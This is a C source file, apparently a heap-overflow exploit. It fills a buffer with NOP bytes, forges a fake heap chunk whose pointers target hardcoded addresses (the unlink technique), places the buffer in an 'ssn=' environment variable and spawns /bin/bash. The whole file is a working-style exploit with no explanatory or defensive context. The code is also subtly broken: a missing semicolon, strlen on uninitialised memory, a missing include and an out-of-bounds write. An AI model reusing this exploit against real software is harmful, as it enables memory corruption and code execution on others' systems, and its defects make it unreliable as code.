#include <stdio.h>
#include <stdlib.h>

#define NOP                            0x90
#define ENV_STRING                   "ssn="

int main(int argc, char *argv[])
{
  char *new_buff, *command_buff;
  long where, what, *ptr;
  
  int bsize = 16, new_bsize, command_bsize, i, env_offset;
  
  where = 0x08049d30 ;
  what = 0x8049ec8

  new_bsize = bsize + 4*4;
  if(!(new_buff = malloc(new_bsize))) {
    printf("Can't allocate exploit buffer.\n");
    exit(0);
  }

  // put some none-null character until the end of the buffer
  for (i=strlen(new_buff); i<bsize; i++){
    new_buff[i] = '\x90';
  }

  // creating a fake heap structure
  ptr = (long *)(new_buff + bsize);
  long size_of_next_chunk = -1;  // 0xFFFFFFFF
  *ptr = *(ptr+1) = size_of_next_chunk;
  *(ptr+2) = where - 12;
  *(ptr+3) = what + 8;

  new_buff[new_bsize] = 0;
  
  env_offset = strlen(ENV_STRING);
  command_bsize = env_offset + new_bsize + 1;
  if(!(command_buff = malloc(command_bsize))) {
    printf("Can't allocate command buffer.\n");
    exit(0);
  }
  strcpy(command_buff, ENV_STRING);
  strcat(command_buff, new_buff);

  putenv(command_buff);
  system("/bin/bash");
}

